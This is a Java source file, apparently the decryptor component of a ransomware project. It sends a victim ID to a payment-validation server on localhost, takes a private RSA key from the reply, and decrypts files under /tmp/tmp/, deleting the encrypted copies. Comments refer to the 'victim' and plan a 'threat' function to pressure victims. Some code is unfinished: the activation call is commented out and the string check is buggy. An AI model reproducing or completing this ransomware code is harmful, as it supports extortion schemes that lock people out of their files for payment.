import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import java.security.spec.InvalidKeySpecException;

class secret {
	KeyPair secret(){
		KeyPairGenerator kpg = null;
		try{
			kpg = KeyPairGenerator.getInstance("RSA");
		} catch (NoSuchAlgorithmException e) {
			throw new RuntimeException(e);
		}
		kpg.initialize(2048);
		KeyPair kp = kpg.generateKeyPair();
		return kp;
	}
	void decryptFiles(int cipherMode,PrivateKey pKey,String inputFile,String outputFile) throws Exception{
		Cipher cipher = Cipher.getInstance("RSA");
		cipher.init(Cipher.DECRYPT_MODE, pKey);
		String textString = "";
		textString = new String(Files.readAllBytes(Paths.get(inputFile)));
		byte[] rawData = Base64.getDecoder().decode(textString.getBytes());
		byte[] plainText = cipher.doFinal(rawData);
		BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile));
		String plainStringText = new String(plainText); 
		writer.write(plainStringText);
		writer.close();
	}
}

class RansomwareDeactivate{
	void decryptAllFiles(PrivateKey privKey) throws IOException{
		secret sec = new secret();
		List<Path> fileNames = new ArrayList<Path>();
		try{
			Stream<Path> paths = Files.walk(Paths.get("/tmp/tmp/"));
			paths.filter(Files::isRegularFile).forEach(fileNames::add);
		}
		catch (Exception e){
			System.out.println(e);
		}
		for(Path file:fileNames){
			try{
				System.out.println("Decrypting file: "+file.toString());
				String inputFile = file.toString();
				String outputFile = inputFile.substring(0, inputFile.lastIndexOf('.'));
				sec.decryptFiles(Cipher.DECRYPT_MODE, privKey, inputFile,outputFile);
				File f = new File(inputFile);
				f.delete();
			}
			catch (Exception e){
				System.out.println(e);
			}
		}
	}		
}

class decrypt {
	static private String[] result;
	static void activate() throws IOException{
		String privKey = result[1].replaceAll("-","").replaceAll("BEGIN PRIVATE KEY","").replaceAll("END PRIVATE KEY","");
		byte[] privateBytes = Base64.getDecoder().decode(privKey);
		PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(privateBytes);
		try{
			KeyFactory keyFactory = KeyFactory.getInstance("RSA");
			PrivateKey privateKey = keyFactory.generatePrivate(keySpec);
			RansomwareDeactivate ransomware  = new RansomwareDeactivate();
			ransomware.decryptAllFiles(privateKey);
		}
		catch (InvalidKeySpecException | NoSuchAlgorithmException e){
			throw new RuntimeException(e);
		}
	}

	//Function to warn user telling them only 3 clicks availble to Decrypt Button to decrease server load
	//void threat(){		
	//}

	static void validatePayment() throws IOException{
		//ID is the victim's ID
		int id = 1;
		URL obj = new URL("http://127.0.0.1/recv.php?decrypt="+id);
		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
		con.setRequestMethod("GET");
		con.addRequestProperty("Victim", "Yes");
		BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
		String inputLine;
		StringBuffer response = new StringBuffer();
		while((inputLine = in.readLine()) != null){
			response.append(inputLine);
		}
		in.close();
		String ans  =response.toString();
		result = ans.split("@",2);
		System.out.println(result[0]);
		if(result[0] == "Yes"){
			//activate();
			System.out.println("Decrypting files!");
		}
		//Implement in future release
		//else{
		//	threat();
		//}
	}
	public static void main(String[] args) throws IOException{
		validatePayment();
	}
}